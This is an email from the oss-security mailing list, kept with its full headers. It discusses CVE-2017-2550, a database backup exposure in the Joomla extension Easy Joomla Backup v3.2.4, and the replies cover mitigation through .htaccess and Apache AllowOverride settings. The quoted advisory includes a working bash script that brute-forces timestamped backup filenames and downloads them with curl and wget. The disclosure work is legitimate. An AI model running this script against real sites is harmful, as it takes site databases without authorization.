X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3442" "Thursday" "28" "September" "2017" "12:05:40" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<28E19EE5-7EC0-4712-80CE-5D2AD4C4B932@me.com>" "100" "Re: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" nil nil nil "9" "2017092816:05:40" "[oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure" (number mark "U       larry0@me.co Sep 28  100/3442  " thread-indent "\"Re: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database backup exposure\"\n") "<etPan.59ccf477.771c0a21.6fc3@community.joomla.org>" ("<E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>" "<etPan.59ccf477.771c0a21.6fc3@community.joomla.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11988 invoked by uid 550); 28 Sep 2017 16:05:56 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11960 invoked from network); 28 Sep 2017 16:05:54 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1506614742; bh=/8ZWC4Dg8C+JH+EoW5i9Rn9dogeXjavSAfpnQ5fTiwk=;
	h=From:Content-type:MIME-version:Subject:Date:To:Message-id;
	b=ty0JdFl86dLfPU7Qy5wJLR/y8Mk0X52MyB0addMUUGaw5hZ7xErnrl1rvfy/QWhjP
 P7UdBtkKjCsgQBNDXEvvMD7/rPh6pneCDHibTjyJVdvuUm5p69QHRnpsMT2uH/nD/r
 Omnr3Wiar5eAAAZ0Fh7ohTAqrEl/uEsjXEia9T8NJXk+9vWkmWppXI1IZSkuxeTIL5
 0YiE2f5pY+ZJTC0P8zTm7LWU4k3gOpmn4UfDDdncwrdFlVrMBodmZ/eeZBoADFcW1d
 3hPW00GN5De0KwAqWopQiFmhvYUr0qhU8N0xX9bwlv9XdQQ1mAjetp2SzO5iS9udLk
 ktuOYvuGmDJNg==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-09-28_05:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1707230000 definitions=main-1709280238
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Date: Thu, 28 Sep 2017 12:05:40 -0400
References: <E969A16B-9B90-4F8A-8ECA-29565C90184C@me.com>
 <etPan.59ccf477.771c0a21.6fc3@community.joomla.org>
To: oss-security@lists.openwall.com
In-reply-to: <etPan.59ccf477.771c0a21.6fc3@community.joomla.org>
Message-id: <28E19EE5-7EC0-4712-80CE-5D2AD4C4B932@me.com>
X-Mailer: Apple Mail (2.3273)
Subject: Re: [oss-security] Joomla extension Easy Joomla Backup v3.2.4 database
 backup exposure

Hi David,

This is correct, hardened shared hosting platforms won't be vulnerable to t=
his attack.

I've now updated the configuration on my lab Ubuntu system by changing apac=
he2.conf:

# diff -Nur orig apache2.conf=20
--- orig	2017-09-28 12:02:13.674668975 -0400
+++ apache2.conf	2017-09-28 11:47:50.898322778 -0400
@@ -163,7 +163,7 @@
=20
 <Directory /var/www/>
 	Options Indexes FollowSymLinks
-	AllowOverride None
+	AllowOverride All
 	Require all granted
 </Directory>

Thanks,
Larry

> On Sep 28, 2017, at 9:09 AM, David Jardin <david.jardin@community.joomla.=
org> wrote:
>=20
> It=E2=80=99s worth to mention that the extension has a default .htaccess =
file with a =E2=80=9Edeny from all=E2=80=9C in the backup directory, that w=
ill mitigate the described attack on pretty much any standard shared-hostin=
g platform that I=E2=80=99m aware of.
>=20
>=20
>=20
>=20
> Am 28. September 2017 um 14:37:20, Larry W. Cashdollar (larry0@me.com) sc=
hrieb:
>=20
>> Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposu=
re=20
>> Author: Larry W. Cashdollar, @_larry0=20
>> Date: 2017-09-07=20
>> CVE-ID:[CVE-2017-2550]=20
>> Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-=
backup=20
>> Vendor: kubik-rubik=20
>> Vendor Notified: 2017-09-07=20
>> Vendor Contact:=20
>> Advisory: http://www.vapidlabs.com/advisory.php?v=3D200=20
>> Description: Easy Joomla Backup creates 'old-school' backups without any=
 frills.=20
>> Vulnerability:=20
>> The software creates a copy of the backup in the web root. The file name=
 is easily guessable as it's just a time stamp:=20
>>=20
>> http://example.com/administrator/components/com_easyjoomlabackup/backups=
/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip=20
>>=20
>> Exploit Code:=20
>> =E2=80=A2 #!/bin/bash=20
>> =E2=80=A2 #Larry W. Cashdollar, @_larry0 9/7/2017=20
>> =E2=80=A2 #Bruteforce download backups for Joomla Extension Easy Joomla =
Backup v3.2.4=20
>> =E2=80=A2 #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-back=
up=20
>> =E2=80=A2 MONTH=3D09=20
>> =E2=80=A2 DAY=3D07=20
>> =E2=80=A2 YEAR=3D2017=20
>> =E2=80=A2 Z=3D0=20
>> =E2=80=A2 #May need to set the DOMAIN to $1 the target depending on how =
WP is configured.=20
>> =E2=80=A2 DOMAIN=3D192.168.0.163=20
>> =E2=80=A2=20=20
>> =E2=80=A2 echo "Scanning website for available backups:"=20
>> =E2=80=A2 for y in `seq -w 0 23`; do=20
>> =E2=80=A2 for x in `seq -w 0 59`; do=20
>> =E2=80=A2 Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;=20
>> =E2=80=A2 echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"=20
>> =E2=80=A2 for z in `seq -w 0 59`; do=20
>> =E2=80=A2 Z=3D$(( $Z + 1 ));=20
>> =E2=80=A2 CPATH=3D"http://$1/administrator/components/com_easyjoomlaback=
up/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";=20
>> =E2=80=A2 RESULT=3D`curl -s --head $CPATH|grep 200`;=20
>> =E2=80=A2 if [ -n "$RESULT" ]; then=20
>> =E2=80=A2 echo ""=20
>> =E2=80=A2 echo "[+] Location $CPATH Found";=20
>> =E2=80=A2 echo "[+] Received $RESULT";=20
>> =E2=80=A2 echo "Downloading......";=20
>> =E2=80=A2 wget $CPATH=20
>> =E2=80=A2 fi;=20
>> =E2=80=A2 done=20
>> =E2=80=A2 done=20
>> =E2=80=A2 done=20
>> =E2=80=A2 echo "Completed."
> --=20
> Kind Regards,
> David Jardin

